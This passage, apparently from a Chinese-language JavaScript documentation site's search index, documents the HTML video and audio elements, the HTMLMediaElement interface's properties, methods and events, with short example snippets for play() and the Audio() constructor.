progress\uff1a\u5a92\u4f53\u6587\u4ef6\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\u89e6\u53d1\uff0c\u5927\u6982\u662f\u6bcf\u79d2\u89e6\u53d12\u52308\u6b21\u3002 loadedmetadata\uff1a\u5a92\u4f53\u6587\u4ef6\u5143\u6570\u636e\u52a0\u8f7d\u6210\u529f\u65f6\u89e6\u53d1\u3002 loadeddata\uff1a\u5f53\u524d\u64ad\u653e\u4f4d\u7f6e\u52a0\u8f7d\u6210\u529f\u540e\u89e6\u53d1\u3002 canplay\uff1a\u5df2\u7ecf\u52a0\u8f7d\u4e86\u8db3\u591f\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u5f00\u59cb\u64ad\u653e\u65f6\u89e6\u53d1\uff0c\u540e\u9762\u53ef\u80fd\u8fd8\u4f1a\u8bf7\u6c42\u6570\u636e\u3002 canplaythrough\uff1a\u5df2\u7ecf\u52a0\u8f7d\u4e86\u8db3\u591f\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u4e00\u76f4\u64ad\u653e\u65f6\u89e6\u53d1\uff0c\u540e\u9762\u4e0d\u9700\u8981\u7ee7\u7eed\u8bf7\u6c42\u6570\u636e\u3002 suspend\uff1a\u5df2\u7ecf\u7f13\u51b2\u4e86\u8db3\u591f\u7684\u6570\u636e\uff0c\u6682\u65f6\u505c\u6b62\u4e0b\u8f7d\u65f6\u89e6\u53d1\u3002 stalled\uff1a\u5c1d\u8bd5\u52a0\u8f7d\u6570\u636e\uff0c\u4f46\u662f\u6ca1\u6709\u6570\u636e\u8fd4\u56de\u65f6\u89e6\u53d1\u3002 play\uff1a\u8c03\u7528 play() \u65b9\u6cd5\u65f6\u6216\u81ea\u52a8\u64ad\u653e\u542f\u52a8\u65f6\u89e6\u53d1\u3002\u5982\u679c\u5df2\u7ecf\u52a0\u8f7d\u4e86\u8db3\u591f\u7684\u6570\u636e\uff0c\u8fd9\u4e2a\u4e8b\u4ef6\u540e\u9762\u4f1a\u7d27\u8ddf playing \u4e8b\u4ef6\uff0c\u5426\u5219\u4f1a\u89e6\u53d1 waiting \u4e8b\u4ef6\u3002 waiting\uff1a\u7531\u4e8e\u6ca1\u6709\u8db3\u591f\u7684\u7f13\u5b58\u6570\u636e\uff0c\u65e0\u6cd5\u64ad\u653e\u6216\u64ad\u653e\u505c\u6b62\u65f6\u89e6\u53d1\u3002\u4e00\u65e6\u7f13\u51b2\u6570\u636e\u8db3\u591f\u5f00\u59cb\u64ad\u653e\uff0c\u540e\u9762\u5c31\u4f1a\u7d27\u8ddf playing \u4e8b\u4ef6\u3002 playing\uff1a\u5a92\u4f53\u5f00\u59cb\u64ad\u653e\u65f6\u89e6\u53d1\u3002 timeupdate\uff1a currentTime \u5c5e\u6027\u53d8\u5316\u65f6\u89e6\u53d1\uff0c\u6bcf\u79d2\u53ef\u80fd\u89e6\u53d14\u523060\u6b21\u3002 pause\uff1a\u8c03\u7528 pause() \u65b9\u6cd5\u3001\u64ad\u653e\u6682\u505c\u65f6\u89e6\u53d1\u3002 seeking\uff1a\u811a\u672c\u6216\u8005\u7528\u6237\u8981\u6c42\u64ad\u653e\u67d0\u4e2a\u6ca1\u6709\u7f13\u51b2\u7684\u4f4d\u7f6e\uff0c\u64ad\u653e\u505c\u6b62\u5f00\u59cb\u52a0\u8f7d\u6570\u636e\u65f6\u89e6\u53d1\u3002\u6b64\u65f6\uff0c seeking \u5c5e\u6027\u8fd4\u56de true \u3002 seeked\uff1a seeking \u5c5e\u6027\u53d8\u56de false \u65f6\u89e6\u53d1\u3002 ended\uff1a\u5a92\u4f53\u6587\u4ef6\u64ad\u653e\u5b8c\u6bd5\u65f6\u89e6\u53d1\u3002 durationchange\uff1a duration \u5c5e\u6027\u53d8\u5316\u65f6\u89e6\u53d1\u3002 volumechange\uff1a\u97f3\u91cf\u53d8\u5316\u65f6\u89e6\u53d1\u3002 ratechange\uff1a\u64ad\u653e\u901f\u5ea6\u6216\u9ed8\u8ba4\u7684\u64ad\u653e\u901f\u5ea6\u53d8\u5316\u65f6\u89e6\u53d1\u3002 abort\uff1a\u505c\u6b62\u52a0\u8f7d\u5a92\u4f53\u6587\u4ef6\u65f6\u89e6\u53d1\uff0c\u901a\u5e38\u662f\u7528\u6237\u4e3b\u52a8\u8981\u6c42\u505c\u6b62\u4e0b\u8f7d\u3002 error\uff1a\u7f51\u7edc\u6216\u5176\u4ed6\u539f\u56e0\u5bfc\u81f4\u5a92\u4f53\u6587\u4ef6\u65e0\u6cd5\u52a0\u8f7d\u65f6\u89e6\u53d1\u3002 emptied\uff1a\u7531\u4e8e error \u6216 abort \u4e8b\u4ef6\u5bfc\u81f4 networkState \u5c5e\u6027\u53d8\u6210\u65e0\u6cd5\u83b7\u53d6\u6570\u636e\u65f6\u89e6\u53d1\u3002","title":"video & audio"},{"location":"elements/video/#_1","text":"","title":"\uff0c"},{"location":"elements/video/#_2","text":"<video> \u5143\u7d20\u7528\u6765\u52a0\u8f7d\u89c6\u9891\uff0c\u662f HTMLVideoElement \u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002 <audio> \u5143\u7d20\u7528\u6765\u52a0\u8f7d\u97f3\u9891\uff0c\u662f HTMLAudioElement \u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002\u800c HTMLVideoElement \u548c HTMLAudioElement \u90fd\u7ee7\u627f\u4e86 HTMLMediaElement \uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a HTML \u5143\u7d20\u6709\u8bb8\u591a\u5171\u540c\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u53ef\u4ee5\u653e\u5728\u4e00\u8d77\u4ecb\u7ecd\u3002 \u7406\u8bba\u4e0a\uff0c\u8fd9\u4e24\u4e2a HTML \u5143\u7d20\u76f4\u63a5\u7528 src \u5c5e\u6027\u6307\u5b9a\u5a92\u4f53\u6587\u4ef6\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e86\u3002 1 2 < audio src = \"background_music.mp3\" /> < video src = \"news.mov\" width = 320 height = 240/ > \u6ce8\u610f\uff0c <video> \u5143\u7d20\u6709 width \u5c5e\u6027\u548c height \u5c5e\u6027\uff0c\u53ef\u4ee5\u6307\u5b9a\u5bbd\u548c\u9ad8\u3002 <audio> \u5143\u7d20\u6ca1\u6709\u8fd9\u4e24\u4e2a\u5c5e\u6027\uff0c\u56e0\u4e3a\u5b83\u7684\u64ad\u653e\u5668\u5916\u5f62\u662f\u6d4f\u89c8\u5668\u7ed9\u5b9a\u7684\uff0c\u4e0d\u80fd\u6307\u5b9a\u3002 \u5b9e\u9645\u4e0a\uff0c\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u652f\u6301\u4e0d\u540c\u7684\u5a92\u4f53\u683c\u5f0f\uff0c\u6211\u4eec\u4e0d\u5f97\u4e0d\u7528 <source> \u5143\u7d20\u6307\u5b9a\u540c\u4e00\u4e2a\u5a92\u4f53\u6587\u4ef6\u7684\u4e0d\u540c\u683c\u5f0f\u3002 1 2 3 4 < audio id = \"music\" > < source src = \"music.mp3\" type = \"audio/mpeg\" > < source src = \"music.ogg\" type = 'audio/ogg; codec=\"vorbis\"' > </ audio > \u6d4f\u89c8\u5668\u9047\u5230\u652f\u6301\u7684\u683c\u5f0f\uff0c\u5c31\u4f1a\u5ffd\u7565\u540e\u9762\u7684\u683c\u5f0f\u3002 \u8fd9\u4e24\u4e2a\u5143\u7d20\u90fd\u6709\u4e00\u4e2a controls \u5c5e\u6027\uff0c\u53ea\u6709\u6253\u5f00\u8fd9\u4e2a\u5c5e\u6027\uff0c\u624d\u4f1a\u663e\u793a\u63a7\u5236\u6761\u3002\u6ce8\u610f\uff0c <audio> \u5143\u7d20\u5982\u679c\u4e0d\u6253\u5f00 controls \u5c5e\u6027\uff0c\u6839\u672c\u4e0d\u4f1a\u663e\u793a\uff0c\u800c\u662f\u76f4\u63a5\u5728\u80cc\u666f\u64ad\u653e\u3002","title":"\u6982\u8ff0"},{"location":"elements/video/#htmlmediaelement","text":"HTMLMediaElement \u5e76\u6ca1\u6709\u5bf9\u5e94\u7684 HTML \u5143\u7d20\uff0c\u800c\u662f\u4f5c\u4e3a <video> \u548c <audio> \u7684\u57fa\u7c7b\uff0c\u5b9a\u4e49\u4e00\u4e9b\u5b83\u4eec\u5171\u540c\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 HTMLMediaElement \u63a5\u53e3\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 HTMLMediaElement.audioTracks\uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u5305\u542b\u7684\u97f3\u8f68\u3002 HTMLMediaElement.autoplay\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u81ea\u52a8\u64ad\u653e\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 autoplay \u3002 HTMLMediaElement.buffered\uff1a\u8fd4\u56de\u4e00\u4e2a TimeRanges \u5bf9\u8c61\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u7f13\u51b2\u7684\u5185\u5bb9\u3002\u8be5\u5bf9\u8c61\u7684 length \u5c5e\u6027\u8fd4\u56de\u7f13\u5b58\u91cc\u9762\u6709\u591a\u5c11\u6bb5\u5185\u5bb9\uff0c start(rangeId) \u65b9\u6cd5\u8fd4\u56de\u6307\u5b9a\u7684\u67d0\u6bb5\u5185\u5bb9\uff08\u4ece0\u5f00\u59cb\uff09\u5f00\u59cb\u7684\u65f6\u95f4\u70b9\uff0c end() \u8fd4\u56de\u6307\u5b9a\u7684\u67d0\u6bb5\u5185\u5bb9\u7ed3\u675f\u7684\u65f6\u95f4\u70b9\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.controls\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u663e\u793a\u5a92\u4f53\u6587\u4ef6\u7684\u63a7\u5236\u680f\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 controls \u3002 HTMLMediaElement.controlsList\uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u8868\u793a\u662f\u5426\u663e\u793a\u63a7\u5236\u680f\u7684\u67d0\u4e9b\u63a7\u4ef6\u3002\u8be5\u5bf9\u8c61\u5305\u542b\u4e09\u4e2a\u53ef\u80fd\u7684\u503c\uff1a nodownload \u3001 nofullscreen \u548c noremoteplayback \u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.crossOrigin\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8de8\u57df\u8bf7\u6c42\u65f6\u662f\u5426\u9644\u5e26\u7528\u6237\u4fe1\u606f\uff08\u6bd4\u5982 Cookie\uff09\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 crossorigin \u3002\u8be5\u5c5e\u6027\u53ea\u6709\u4e24\u4e2a\u53ef\u80fd\u7684\u503c\uff1a anonymous \u548c use-credentials \u3002 HTMLMediaElement.currentSrc\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6b63\u5728\u64ad\u653e\u7684\u5a92\u4f53\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.currentTime\uff1a\u6d6e\u70b9\u6570\uff0c\u8868\u793a\u5f53\u524d\u64ad\u653e\u7684\u65f6\u95f4\u70b9\u3002 HTMLMediaElement.defaultMuted\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u9ed8\u8ba4\u662f\u5426\u5173\u95ed\u97f3\u91cf\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 muted \u3002 HTMLMediaElement.defaultPlaybackRate\uff1a\u6d6e\u70b9\u6570\uff0c\u8868\u793a\u9ed8\u8ba4\u7684\u64ad\u653e\u901f\u7387\uff0c\u9ed8\u8ba4\u662f1.0\u3002 HTMLMediaElement.disableRemotePlayback\uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u5141\u8bb8\u8fdc\u7a0b\u56de\u653e\uff0c\u5373\u8fdc\u7a0b\u56de\u653e\u7684\u65f6\u5019\u662f\u5426\u4f1a\u6709\u5de5\u5177\u680f\u3002 HTMLMediaElement.duration\uff1a\u6d6e\u70b9\u6570\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u7684\u65f6\u95f4\u957f\u5ea6\uff08\u5355\u4f4d\u79d2\uff09\u3002\u5982\u679c\u5f53\u524d\u6ca1\u6709\u5a92\u4f53\u6587\u4ef6\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de0\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.ended\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u5df2\u7ecf\u64ad\u653e\u7ed3\u675f\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.error\uff1a\u8fd4\u56de\u6700\u8fd1\u4e00\u6b21\u62a5\u9519\u7684\u9519\u8bef\u5bf9\u8c61\uff0c\u5982\u679c\u6ca1\u6709\u62a5\u9519\uff0c\u8fd4\u56de null \u3002 HTMLMediaElement.loop\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u4f1a\u5faa\u73af\u64ad\u653e\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 loop \u3002 HTMLMediaElement.muted\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u97f3\u91cf\u662f\u5426\u5173\u95ed\u3002 HTMLMediaElement.networkState\uff1a\u5f53\u524d\u7f51\u7edc\u72b6\u6001\uff0c\u5171\u6709\u56db\u4e2a\u53ef\u80fd\u7684\u503c\u30020\u8868\u793a\u6ca1\u6709\u6570\u636e\uff1b1\u8868\u793a\u5a92\u4f53\u5143\u7d20\u5904\u5728\u6fc0\u6d3b\u72b6\u6001\uff0c\u4f46\u662f\u8fd8\u6ca1\u5f00\u59cb\u4e0b\u8f7d\uff1b2\u8868\u793a\u4e0b\u8f7d\u4e2d\uff1b3\u8868\u793a\u6ca1\u6709\u627e\u5230\u5a92\u4f53\u6587\u4ef6\u3002 HTMLMediaElement.paused\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u5904\u5728\u6682\u505c\u72b6\u6001\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.playbackRate\uff1a\u6d6e\u70b9\u6570\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u7684\u64ad\u653e\u901f\u5ea6\uff0c1.0\u662f\u6b63\u5e38\u901f\u5ea6\u3002\u5982\u679c\u662f\u8d1f\u6570\uff0c\u8868\u793a\u5411\u540e\u64ad\u653e\u3002 HTMLMediaElement.played\uff1a\u8fd4\u56de\u4e00\u4e2a TimeRanges \u5bf9\u8c61\uff0c\u8868\u793a\u64ad\u653e\u7684\u5a92\u4f53\u5185\u5bb9\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.preload\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5e94\u8be5\u9884\u52a0\u8f7d\u54ea\u4e9b\u5185\u5bb9\uff0c\u53ef\u80fd\u7684\u503c\u4e3a none \u3001 metadata \u548c auto \u3002 HTMLMediaElement.readyState\uff1a\u6574\u6570\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u7684\u51c6\u5907\u72b6\u6001\uff0c\u53ef\u80fd\u7684\u503c\u4e3a0\uff08\u6ca1\u6709\u4efb\u4f55\u6570\u636e\uff09\u30011\uff08\u5df2\u83b7\u53d6\u5143\u6570\u636e\uff09\u30012\uff08\u53ef\u64ad\u653e\u5f53\u524d\u5e27\uff0c\u4f46\u4e0d\u8db3\u4ee5\u64ad\u653e\u591a\u4e2a\u5e27\uff09\u30013\uff08\u53ef\u4ee5\u64ad\u653e\u591a\u5e27\uff0c\u81f3\u5c11\u4e3a\u4e24\u5e27\uff09\u30014\uff08\u53ef\u4ee5\u6d41\u7545\u64ad\u653e\uff09\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.seekable\uff1a\u8fd4\u56de\u4e00\u4e2a TimeRanges \u5bf9\u8c61\uff0c\u8868\u793a\u4e00\u4e2a\u7528\u6237\u53ef\u4ee5\u641c\u7d22\u7684\u5a92\u4f53\u5185\u5bb9\u8303\u56f4\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.seeking\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u6b63\u5728\u5bfb\u627e\u65b0\u4f4d\u7f6e\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.src\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u6240\u5728\u7684 URL\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 src \u3002 HTMLMediaElement.srcObject\uff1a\u8fd4\u56de src \u5c5e\u6027\u5bf9\u5e94\u7684\u5a92\u4f53\u6587\u4ef6\u8d44\u6e90\uff0c\u53ef\u80fd\u662f MediaStream \u3001 MediaSource \u3001 Blob \u6216 File \u5bf9\u8c61\u3002\u76f4\u63a5\u6307\u5b9a\u8fd9\u4e2a\u5c5e\u6027\uff0c\u5c31\u53ef\u4ee5\u64ad\u653e\u5a92\u4f53\u6587\u4ef6\u3002 HTMLMediaElement.textTracks\uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u5305\u542b\u6240\u6709\u6587\u672c\u8f68\u9053\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.videoTracks\uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u5305\u542b\u591a\u6709\u89c6\u9891\u8f68\u9053\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 HTMLMediaElement.volume\uff1a\u6d6e\u70b9\u6570\uff0c\u8868\u793a\u97f3\u91cf\u30020.0 \u8868\u793a\u9759\u97f3\uff0c1.0 \u8868\u793a\u6700\u5927\u97f3\u91cf\u3002 HTMLMediaElement \u63a5\u53e3\u6709\u5982\u4e0b\u65b9\u6cd5\u3002 HTMLMediaElement.addTextTrack()\uff1a\u6dfb\u52a0\u6587\u672c\u8f68\u9053\uff08\u6bd4\u5982\u5b57\u5e55\uff09\u5230\u5a92\u4f53\u6587\u4ef6\u3002 HTMLMediaElement.captureStream()\uff1a\u8fd4\u56de\u4e00\u4e2a MediaStream \u5bf9\u8c61\uff0c\u7528\u6765\u6355\u83b7\u5f53\u524d\u5a92\u4f53\u6587\u4ef6\u7684\u6d41\u5185\u5bb9\u3002 HTMLMediaElement.canPlayType()\uff1a\u8be5\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a MIME \u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u7528\u6765\u5224\u65ad\u8fd9\u79cd\u7c7b\u578b\u7684\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u53ef\u4ee5\u64ad\u653e\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6709\u4e09\u79cd\u53ef\u80fd\u7684\u503c\uff0c probably \u8868\u793a\u4f3c\u4e4e\u53ef\u64ad\u653e\uff0c maybe \u8868\u793a\u65e0\u6cd5\u5728\u4e0d\u64ad\u653e\u7684\u60c5\u51b5\u4e0b\u5224\u65ad\u662f\u5426\u53ef\u64ad\u653e\uff0c\u7a7a\u5b57\u7b26\u4e32\u8868\u793a\u65e0\u6cd5\u64ad\u653e\u3002 HTMLMediaElement.fastSeek()\uff1a\u8be5\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u6d6e\u70b9\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u6307\u5b9a\u7684\u65f6\u95f4\uff08\u5355\u4f4d\u79d2\uff09\u3002\u8be5\u65b9\u6cd5\u5c06\u5a92\u4f53\u6587\u4ef6\u79fb\u52a8\u5230\u6307\u5b9a\u65f6\u95f4\u3002 HTMLMediaElement.load()\uff1a\u91cd\u65b0\u52a0\u8f7d\u5a92\u4f53\u6587\u4ef6\u3002 HTMLMediaElement.pause()\uff1a\u6682\u505c\u64ad\u653e\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 HTMLMediaElement.play()\uff1a\u5f00\u59cb\u64ad\u653e\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a Promise \u5bf9\u8c61\u3002 \u4e0b\u9762\u662f play() \u65b9\u6cd5\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 var myVideo = document . getElementById ( 'myVideoElement' ); myVideo . play () . then (() => { console . log ( 'playing' ); }) . catch (( error ) => { console . log ( error ); });","title":"HTMLMediaElement \u63a5\u53e3"},{"location":"elements/video/#htmlvideoelement","text":"HTMLVideoElement \u63a5\u53e3\u4ee3\u8868\u4e86 <video> \u5143\u7d20\u3002\u8fd9\u4e2a\u63a5\u53e3\u7ee7\u627f\u4e86 HTMLMediaElement \u63a5\u53e3\uff0c\u5e76\u4e14\u6709\u4e00\u4e9b\u81ea\u5df1\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 HTMLVideoElement \u63a5\u53e3\u7684\u5c5e\u6027\u3002 HTMLVideoElement.height\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u89c6\u9891\u64ad\u653e\u533a\u57df\u7684\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 height \u3002 HTMLVideoElement.width\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u89c6\u9891\u64ad\u653e\u533a\u57df\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 width \u3002 HTMLVideoElement.videoHeight\uff1a\u8be5\u5c5e\u6027\u53ea\u8bfb\uff0c\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u89c6\u9891\u6587\u4ef6\u81ea\u8eab\u7684\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002 HTMLVideoElement.videoWidth\uff1a\u8be5\u5c5e\u6027\u53ea\u8bfb\uff0c\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u89c6\u9891\u6587\u4ef6\u81ea\u8eab\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002 HTMLVideoElement.poster\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e00\u4e2a\u56fe\u50cf\u6587\u4ef6\u7684 URL\uff0c\u7528\u6765\u5728\u65e0\u6cd5\u83b7\u53d6\u89c6\u9891\u6587\u4ef6\u65f6\u66ff\u4ee3\u663e\u793a\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027 poster \u3002 HTMLVideoElement \u63a5\u53e3\u7684\u65b9\u6cd5\u3002 HTMLVideoElement.getVideoPlaybackQuality()\uff1a\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5305\u542b\u4e86\u5f53\u524d\u89c6\u9891\u56de\u653e\u7684\u4e00\u4e9b\u6570\u636e\u3002","title":"HTMLVideoElement \u63a5\u53e3"},{"location":"elements/video/#htmlaudioelement","text":"HTMLAudioElement \u63a5\u53e3\u4ee3\u8868\u4e86 <audio> \u5143\u7d20\u3002 \u8be5\u63a5\u53e3\u7ee7\u627f\u4e86 HTMLMediaElement \uff0c\u4f46\u662f\u6ca1\u6709\u5b9a\u4e49\u81ea\u5df1\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a Audio() \u6784\u9020\u51fd\u6570\uff0c\u8fd4\u56de\u7684\u5c31\u662f HTMLAudioElement \u5b9e\u4f8b\u3002 1 var song = new Audio ([ URLString ]); Audio() \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u7684 URL\u3002\u5982\u679c\u7701\u7565\u8fd9\u4e2a\u53c2\u6570\uff0c\u53ef\u4ee5\u7a0d\u540e\u901a\u8fc7 src \u5c5e\u6027\u6307\u5b9a\u3002 \u751f\u6210 HTMLAudioElement \u5b9e\u4f8b\u4ee5\u540e\uff0c\u4e0d\u7528\u63d2\u5165 DOM\uff0c\u53ef\u4ee5\u76f4\u63a5\u7528 play() \u65b9\u6cd5\u5728\u80cc\u666f\u64ad\u653e\u3002 javascript var a = new Audio(); if (a.canPlayType('audio/wav')) { a.src = 'soundeffect.wav'; a.play(); }","title":"HTMLAudioElement \u63a5\u53e3"},{"location":"elements/video/#_3","text":"<video> \u548c <audio> \u5143\u7d20\u6709\u4ee5\u4e0b\u4e8b\u4ef6\u3002 loadstart\uff1a\u5f00\u59cb\u52a0\u8f7d\u5a92\u4f53\u6587\u4ef6\u65f6\u89e6\u53d1\u3002 progress\uff1a\u5a92\u4f53\u6587\u4ef6\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\u89e6\u53d1\uff0c\u5927\u6982\u662f\u6bcf\u79d2\u89e6\u53d12\u52308\u6b21\u3002 loadedmetadata\uff1a\u5a92\u4f53\u6587\u4ef6\u5143\u6570\u636e\u52a0\u8f7d\u6210\u529f\u65f6\u89e6\u53d1\u3002 loadeddata\uff1a\u5f53\u524d\u64ad\u653e\u4f4d\u7f6e\u52a0\u8f7d\u6210\u529f\u540e\u89e6\u53d1\u3002 canplay\uff1a\u5df2\u7ecf\u52a0\u8f7d\u4e86\u8db3\u591f\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u5f00\u59cb\u64ad\u653e\u65f6\u89e6\u53d1\uff0c\u540e\u9762\u53ef\u80fd\u8fd8\u4f1a\u8bf7\u6c42\u6570\u636e\u3002 canplaythrough\uff1a\u5df2\u7ecf\u52a0\u8f7d\u4e86\u8db3\u591f\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u4e00\u76f4\u64ad\u653e\u65f6\u89e6\u53d1\uff0c\u540e\u9762\u4e0d\u9700\u8981\u7ee7\u7eed\u8bf7\u6c42\u6570\u636e\u3002 suspend\uff1a\u5df2\u7ecf\u7f13\u51b2\u4e86\u8db3\u591f\u7684\u6570\u636e\uff0c\u6682\u65f6\u505c\u6b62\u4e0b\u8f7d\u65f6\u89e6\u53d1\u3002 stalled\uff1a\u5c1d\u8bd5\u52a0\u8f7d\u6570\u636e\uff0c\u4f46\u662f\u6ca1\u6709\u6570\u636e\u8fd4\u56de\u65f6\u89e6\u53d1\u3002 play\uff1a\u8c03\u7528 play() \u65b9\u6cd5\u65f6\u6216\u81ea\u52a8\u64ad\u653e\u542f\u52a8\u65f6\u89e6\u53d1\u3002\u5982\u679c\u5df2\u7ecf\u52a0\u8f7d\u4e86\u8db3\u591f\u7684\u6570\u636e\uff0c\u8fd9\u4e2a\u4e8b\u4ef6\u540e\u9762\u4f1a\u7d27\u8ddf playing \u4e8b\u4ef6\uff0c\u5426\u5219\u4f1a\u89e6\u53d1 waiting \u4e8b\u4ef6\u3002 waiting\uff1a\u7531\u4e8e\u6ca1\u6709\u8db3\u591f\u7684\u7f13\u5b58\u6570\u636e\uff0c\u65e0\u6cd5\u64ad\u653e\u6216\u64ad\u653e\u505c\u6b62\u65f6\u89e6\u53d1\u3002\u4e00\u65e6\u7f13\u51b2\u6570\u636e\u8db3\u591f\u5f00\u59cb\u64ad\u653e\uff0c\u540e\u9762\u5c31\u4f1a\u7d27\u8ddf playing \u4e8b\u4ef6\u3002 playing\uff1a\u5a92\u4f53\u5f00\u59cb\u64ad\u653e\u65f6\u89e6\u53d1\u3002 timeupdate\uff1a currentTime \u5c5e\u6027\u53d8\u5316\u65f6\u89e6\u53d1\uff0c\u6bcf\u79d2\u53ef\u80fd\u89e6\u53d14\u523060\u6b21\u3002 pause\uff1a\u8c03\u7528 pause() \u65b9\u6cd5\u3001\u64ad\u653e\u6682\u505c\u65f6\u89e6\u53d1\u3002 seeking\uff1a\u811a\u672c\u6216\u8005\u7528\u6237\u8981\u6c42\u64ad\u653e\u67d0\u4e2a\u6ca1\u6709\u7f13\u51b2\u7684\u4f4d\u7f6e\uff0c\u64ad\u653e\u505c\u6b62\u5f00\u59cb\u52a0\u8f7d\u6570\u636e\u65f6\u89e6\u53d1\u3002\u6b64\u65f6\uff0c seeking \u5c5e\u6027\u8fd4\u56de true \u3002 seeked\uff1a seeking \u5c5e\u6027\u53d8\u56de false \u65f6\u89e6\u53d1\u3002 ended\uff1a\u5a92\u4f53\u6587\u4ef6\u64ad\u653e\u5b8c\u6bd5\u65f6\u89e6\u53d1\u3002 durationchange\uff1a duration \u5c5e\u6027\u53d8\u5316\u65f6\u89e6\u53d1\u3002 